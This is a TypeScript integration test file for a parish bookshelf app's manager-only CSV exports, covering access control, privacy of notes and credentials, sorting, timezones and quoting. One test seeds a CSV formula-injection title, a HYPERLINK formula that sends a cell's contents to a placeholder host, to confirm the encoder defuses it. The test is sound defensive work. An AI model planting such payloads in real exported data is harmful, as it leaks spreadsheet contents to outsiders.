import { afterAll, beforeAll, beforeEach, expect, test } from "vitest";
import { migrate } from "../../../src/db/migrate";
import { lendCopy } from "../../../src/domain/circulation/commands/lend-copy";
import { receiveReturn } from "../../../src/domain/circulation/commands/receive-return";
import { voidLoan } from "../../../src/domain/circulation/commands/void-loan";
import { fixedClock } from "../../../src/domain/kernel/clock";
import { RuleViolated } from "../../../src/domain/kernel/errors";
import { approveMembership } from "../../../src/domain/members/commands/approve-membership";
import type { TenantContext } from "../../../src/domain/kernel/tenant";
import { runCommand, runQuery } from "../../../src/domain/kernel/unit-of-work";
import {
  exportBooks,
  exportLoans,
  exportReaders,
} from "../../../src/domain/shelf/queries/exports";
import { toCsv, toCsvBytes } from "../../../src/lib/csv";
import { booksTable, loansTable, readersTable } from "../../../src/lib/exports";
import { closeAll, resetDatabase, sql } from "../../support/db";
import {
  makeBookWithCopies,
  makeMember,
  makeParishUnits,
  makeShelf,
} from "../../support/factories";
import { managerContextFor } from "../../support/scenarios";

beforeAll(() => migrate(sql));
beforeEach(resetDatabase);
afterAll(closeAll);

/**
 * OPS §3.3's three exports, and P1 §3.5's two demands about them: the
 * `manager` gate is **provable by test**, and the file contains nothing BR
 * §16.3 does not already show a manager on screen.
 *
 * §16.1 is *Public pages* — landing, contact, portal, catalogue, book detail —
 * and says nothing about what a manager sees of a child. The section that does
 * is §16.3, Readers: "Detail view shows the full profile — including the
 * manager-only fields". The plan, this file and `exports.ts` all cited the
 * wrong number; all four sites are corrected together, because a bound is only
 * checkable against the section that actually states it.
 */

async function shelfWithManager(slug: string) {
  const shelf = await makeShelf(sql, { slug });
  const manager = await makeMember(sql, shelf.id, { role: "manager" });
  return { shelf, manager, ctx: managerContextFor(shelf.id, manager) };
}

function readerCtx(bookshelfId: string, member: { id: string; userId: string }) {
  return {
    bookshelfId,
    actor: { userId: member.userId, membershipId: member.id, role: "reader" },
    clock: fixedClock("2026-08-07T10:00:00Z"),
  } as const satisfies TenantContext;
}

test("a reader cannot run any of the three exports", async () => {
  // §3.5(a), in full: all three, named individually, because a gate that is on
  // two of three is the shape a `toEqual` over a loop would hide.
  const { shelf } = await shelfWithManager("dong-thap");
  const reader = await makeMember(sql, shelf.id);
  const ctx = readerCtx(shelf.id, reader);

  await expect(runQuery(sql, ctx, exportBooks)).rejects.toThrow(RuleViolated);
  await expect(runQuery(sql, ctx, exportReaders)).rejects.toThrow(RuleViolated);
  await expect(runQuery(sql, ctx, exportLoans)).rejects.toThrow(RuleViolated);
});

test("a manager of one shelf exports nothing of another's", async () => {
  const a = await shelfWithManager("dong-thap");
  const b = await shelfWithManager("vinh-long");

  const bookB = await makeBookWithCopies(sql, b.shelf.id, 3);
  const readerB = await makeMember(sql, b.shelf.id);
  await runCommand(sql, b.ctx, lendCopy, {
    copyId: bookB.copyIds[0],
    membershipId: readerB.id,
  });

  // The positive control, first and deliberately. Every assertion below this is
  // that a list is *empty*, and an empty list is exactly what a fixture that
  // wrote nothing also produces — U3 shipped two tiebreak tests that were green
  // in the broken state, one of them on a degenerate fixture. So Vĩnh Long's own
  // manager is asked for the same three files, and has to see the rows before
  // Đồng Tháp's manager is asked not to.
  expect(await runQuery(sql, b.ctx, exportBooks)).toHaveLength(3);
  expect(await runQuery(sql, b.ctx, exportLoans)).toHaveLength(1);
  expect(await runQuery(sql, b.ctx, exportReaders)).toHaveLength(2);

  expect(await runQuery(sql, a.ctx, exportBooks)).toEqual([]);
  expect(await runQuery(sql, a.ctx, exportLoans)).toEqual([]);
  // Not `[]`: Đồng Tháp has its own manager, and that membership is a row this
  // export is meant to carry. What must not appear is Vĩnh Long's reader.
  const readers = await runQuery(sql, a.ctx, exportReaders);
  expect(readers).toHaveLength(1);
  expect(readers[0].fullName).not.toBe("");

  const namesInB = (await runQuery(sql, b.ctx, exportReaders)).map(
    (r) => r.fullName,
  );
  expect(namesInB).not.toContain(readers[0].fullName);
});

test("the readers export carries no manager's private note", async () => {
  // §3.5(b), and the column that made the bound worth checking rather than
  // asserting. `memberships.manager_notes` is BR §5.4's "manager's private
  // notes"; **no screen in this application renders it** — `grep -rn
  // "managerNotes\|manager_notes" src --include='*.tsx'` finds nothing — so it
  // was never inside the bound, and the plan's reconciliation recorded it as
  // rendered on `quan-ly/nguoi-doc/[id]` when it is not.
  //
  // No shipped command writes the column either, which is why the note below
  // goes in with raw SQL and why removing it cost nothing at the time. The
  // sentence is the point: this is the kind of thing a volunteer writes in a
  // box marked private, and a downloadable file is not where it belongs.
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const reader = await makeMember(sql, shelf.id);
  await sql`
    update memberships set manager_notes = 'bố hay uống rượu, gọi mẹ'
    where id = ${reader.id}
  `;

  const rows = await runQuery(sql, ctx, exportReaders);
  const table = readersTable(rows);
  const csv = toCsv(...tableOf(table));

  expect(csv).not.toContain("uống rượu");
  expect(table.headers).not.toContain("Ghi chú của quản lý");
  // The row type too, not only the file: a column restored to the query but
  // left out of the table would be a leak one refactor away, and this is the
  // assertion that says so.
  expect(rows[0]).not.toHaveProperty("managerNotes");
  // The positive control. Every assertion above is that something is *absent*,
  // which an export returning no rows at all satisfies perfectly — the shelf
  // has its manager and this reader.
  expect(rows).toHaveLength(2);
  expect(csv).toContain("Ngày tham gia");
});

test("the readers export carries no username and no hash", async () => {
  // §3.5(b) and INV-14. `has_credentials` is the boolean `getReaderDetail`
  // already substitutes on screen; the file answers "can this child sign in
  // from home" without being a list of accounts to try.
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const reader = await makeMember(sql, shelf.id);
  await sql`
    update users set username = 'minh.tran', password_hash = '$argon2id$secret'
    where id = ${reader.userId}
  `;

  const rows = await runQuery(sql, ctx, exportReaders);
  const csv = toCsv(...tableOf(readersTable(rows)));

  expect(csv).not.toContain("minh.tran");
  expect(csv).not.toContain("argon2");
  expect(csv).toContain("Có tài khoản đăng nhập");
  expect(rows.find((r) => r.fullName)?.hasCredentials !== undefined).toBe(true);
});

/** `CsvTable` → `toCsv`'s two arguments, so a test reads as one call. */
function tableOf(table: { headers: string[]; rows: string[][] }) {
  return [table.headers, table.rows] as const;
}

test("a title beginning with = is not a formula by the time it reaches the file", async () => {
  // §5's acceptance criterion, end to end rather than at the encoder: the title
  // goes into `books` through SQL, comes out through the real query, is turned
  // into a table by the real mapper and encoded by the real encoder. A unit
  // test of `toCsv` alone would stay green against a column that bypassed it.
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const { bookId } = await makeBookWithCopies(sql, shelf.id, 1);
  await sql`
    update books
    set title = '=HYPERLINK("http://x.tld/"&A2,"Bấm vào đây")'
    where id = ${bookId}
  `;

  const csv = toCsv(...tableOf(booksTable(await runQuery(sql, ctx, exportBooks))));
  const titleCell = csv.split("\r\n")[1].split(",")[0];

  expect(titleCell.startsWith("=")).toBe(false);
  expect(titleCell.startsWith('"=')).toBe(false);
  expect(csv).toContain("HYPERLINK"); // nothing was deleted
});

test("the books file opens as UTF-8 with the mark Excel needs", async () => {
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const { bookId } = await makeBookWithCopies(sql, shelf.id, 2);
  await sql`update books set title = 'Đất Rừng Phương Nam' where id = ${bookId}`;

  const bytes = toCsvBytes(
    ...tableOf(booksTable(await runQuery(sql, ctx, exportBooks))),
  );
  expect([...bytes.slice(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
  const text = new TextDecoder("utf-8").decode(bytes);
  expect(text).toContain("Đất Rừng Phương Nam");
  // One row per copy, not per title — the file is a stocktaking sheet.
  expect(text.trimEnd().split("\r\n")).toHaveLength(3);
});

test("the books export sorts Đ where a reader expects it, not last", async () => {
  // The collation trap's first half. This cluster sorts by bytes, and `Đ` is
  // `C4 90` — above every ASCII letter — so an unfolded `order by title` puts
  // every Đất Rừng and Đặng at the end of the file.
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  for (const title of ["Vừa Nhắm Mắt", "Đất Rừng Phương Nam", "Ai Cũng Có"]) {
    const { bookId } = await makeBookWithCopies(sql, shelf.id, 1);
    await sql`update books set title = ${title} where id = ${bookId}`;
  }

  const titles = (await runQuery(sql, ctx, exportBooks)).map((r) => r.title);
  expect(titles).toEqual(["Ai Cũng Có", "Đất Rừng Phương Nam", "Vừa Nhắm Mắt"]);
});

test("the readers export sorts Đ the same way and names the shelf's own units", async () => {
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  await sql`update users set full_name = 'Vũ Thị Mai' where id = ${
    (
      await sql<{ user_id: string }[]>`
      select user_id from memberships where bookshelf_id = ${shelf.id}
    `
    )[0].user_id
  }`;
  const units = await makeParishUnits(
    sql,
    shelf.id,
    { levels: 2, nested: true, level1Label: "Giáo họ", level2Label: "Tổ" },
    [
      { level: 1, name: "Thánh Tâm" },
      { level: 2, name: "Tổ 3", parentName: "Thánh Tâm" },
    ],
  );

  const dang = await makeMember(sql, shelf.id);
  await sql`update users set full_name = 'Đặng Thị Kim Chi' where id = ${dang.userId}`;
  await sql`
    update memberships
    set parish_unit_l1_id = ${units.get("Thánh Tâm")!},
        parish_unit_l2_id = ${units.get("Tổ 3")!}
    where id = ${dang.id}
  `;
  const an = await makeMember(sql, shelf.id);
  await sql`update users set full_name = 'An Nguyễn' where id = ${an.userId}`;

  const rows = await runQuery(sql, ctx, exportReaders);
  expect(rows.map((r) => r.fullName)).toEqual([
    "An Nguyễn",
    "Đặng Thị Kim Chi",
    "Vũ Thị Mai",
  ]);
  // `describeSelection`'s line — the shelf's own unit names, never two uuids.
  expect(rows[1].parishLine).toBe("Tổ 3 · Thánh Tâm");
});

test("the loans export is history, voided loans and their reasons included", async () => {
  // INV-11: loans are never deleted, so "CSV of loan history" means all of
  // them. BR §11's whole argument for voiding rather than deleting is that
  // "why is there no loan here" has an answer six months later, and the answer
  // is the reason — so it has to be in the file.
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const one = await makeBookWithCopies(sql, shelf.id, 1);
  const two = await makeBookWithCopies(sql, shelf.id, 1);
  const reader = await makeMember(sql, shelf.id);
  await sql`update users set full_name = 'Giuse Trần Minh' where id = ${reader.userId}`;

  const kept = await runCommand(sql, ctx, lendCopy, {
    copyId: one.copyIds[0],
    membershipId: reader.id,
  });
  await runCommand(sql, ctx, receiveReturn, {
    loanId: kept.loanId,
    condition: "slightly_worn",
  });
  const scrapped = await runCommand(sql, ctx, lendCopy, {
    copyId: two.copyIds[0],
    membershipId: reader.id,
  });
  await runCommand(sql, ctx, voidLoan, {
    loanId: scrapped.loanId,
    reason: "Bấm nhầm, sách vẫn ở trên kệ",
  });

  const rows = await runQuery(sql, ctx, exportLoans);
  expect(rows).toHaveLength(2);

  const csv = toCsv(...tableOf(loansTable(rows)));
  expect(csv).toContain("Đã trả");
  expect(csv).toContain("Hơi cũ");
  expect(csv).toContain("Đã huỷ");
  expect(csv).toContain("Bấm nhầm, sách vẫn ở trên kệ");
  expect(csv).toContain("Giuse Trần Minh");
  // Every enum is a Vietnamese word. The English spellings are the database's
  // and must not reach a volunteer's spreadsheet.
  for (const raw of ["returned", "voided", "slightly_worn", "active"]) {
    expect(csv, raw).not.toContain(raw);
  }
});

test("a loan's instants are the shelf's own timezone, not UTC", async () => {
  // Found by downloading the file, not by reading the writer. `l.lent_at::text`
  // renders `2026-08-09 12:00:51.212+00` — UTC — so a book handed over at seven
  // in the evening in Đồng Tháp read as noon, and anything lent after 5pm local
  // read as the *previous day*. §4 of the requirements fixes
  // `Asia/Ho_Chi_Minh` as the application timezone regardless of where the
  // process runs.
  const shelf = await makeShelf(sql, { slug: "dong-thap" });
  const manager = await makeMember(sql, shelf.id, { role: "manager" });
  // 19:00 on the 9th in Ho Chi Minh City; 12:00 on the 9th in UTC.
  const ctx = managerContextFor(shelf.id, manager, "2026-08-09T12:00:51.212Z");
  const { copyIds } = await makeBookWithCopies(sql, shelf.id, 1);
  const reader = await makeMember(sql, shelf.id);
  const { loanId } = await runCommand(sql, ctx, lendCopy, {
    copyId: copyIds[0],
    membershipId: reader.id,
  });
  // Half past midnight on the *tenth*, local — 17:30 on the ninth in UTC. The
  // return column is the same expression as the lend column, so it is asserted
  // separately rather than assumed: this is the instant where the two spellings
  // disagree about the calendar day, not merely about the hour.
  await runCommand(
    sql,
    managerContextFor(shelf.id, manager, "2026-08-09T17:30:00.000Z"),
    receiveReturn,
    { loanId, condition: "perfect" },
  );

  const [row] = await runQuery(sql, ctx, exportLoans);
  expect(row.lentOn).toBe("2026-08-09 19:00:51");
  expect(row.returnedOn).toBe("2026-08-10 00:30:00");
  // No offset suffix and no fractional seconds: several spreadsheets stop
  // recognising the cell as a datetime with either of them present.
  for (const instant of [row.lentOn, row.returnedOn!]) {
    expect(instant).not.toContain("+");
    expect(instant).not.toContain(".");
  }
});

test("a reader's joining day is the shelf's own, not the session's", async () => {
  // The third instant in this file, and the same defect as the two above:
  // `memberships.approved_at` is a `timestamptz` and a bare `::date` resolves it
  // through the *session* TimeZone — UTC on this cluster only because that is
  // Docker's default, since `compose.yaml` pins `datestyle` and no TimeZone at
  // all. DATABASE.md §2.2: never rely on it for correctness. A reader
  // approved at half past midnight on the tenth in Đồng Tháp is 17:30Z on the
  // ninth, so the unqualified cast files them under the ninth — a whole day
  // wrong, in a column headed "Ngày tham gia", on every approval made after 5pm
  // local. Seven hours of every evening, which is when a parish shelf is open.
  const shelf = await makeShelf(sql, { slug: "dong-thap" });
  const manager = await makeMember(sql, shelf.id, { role: "manager" });
  const applicant = await makeMember(sql, shelf.id, { status: "pending" });
  await runCommand(
    sql,
    managerContextFor(shelf.id, manager, "2026-08-09T17:30:00.000Z"),
    approveMembership,
    { membershipId: applicant.id },
  );

  const rows = await runQuery(
    sql,
    managerContextFor(shelf.id, manager),
    exportReaders,
  );
  // Exactly one row carries a joining day: `makeMember` inserts the manager
  // directly, with no `approved_at`. Asserting the count first is what stops
  // this passing against an export that lost the column altogether.
  const joined = rows.filter((r) => r.joinedOn !== null);
  expect(joined).toHaveLength(1);
  expect(joined[0].joinedOn).toBe("2026-08-10");
});

test("a free-text reason with a comma, a quote and a newline survives", async () => {
  const { shelf, ctx } = await shelfWithManager("dong-thap");
  const { copyIds } = await makeBookWithCopies(sql, shelf.id, 1);
  const reader = await makeMember(sql, shelf.id);
  const { loanId } = await runCommand(sql, ctx, lendCopy, {
    copyId: copyIds[0],
    membershipId: reader.id,
  });
  const reason = 'Bấm nhầm, mẹ em nói "chưa mượn"\nsẽ mượn tuần sau';
  await runCommand(sql, ctx, voidLoan, { loanId, reason });

  const csv = toCsv(...tableOf(loansTable(await runQuery(sql, ctx, exportLoans))));
  expect(csv).toContain('"Bấm nhầm, mẹ em nói ""chưa mượn""\nsẽ mượn tuần sau"');
});
